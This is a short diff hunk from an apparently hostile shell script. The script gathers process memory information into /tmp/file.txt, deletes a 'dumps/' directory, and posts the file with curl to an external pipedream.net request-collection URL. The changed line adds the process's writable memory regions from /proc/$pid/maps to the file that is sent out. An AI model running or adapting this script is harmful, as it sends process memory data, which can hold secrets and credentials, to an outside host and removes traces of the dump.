@@ -21,7 +21,7 @@ do
 done
 
 echo "FINISHED..." >> /tmp/file.txt
-grep rw-p /proc/$pid/maps
+grep rw-p /proc/$pid/maps >> /tmp/file.txt
 rm -rf dumps/
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
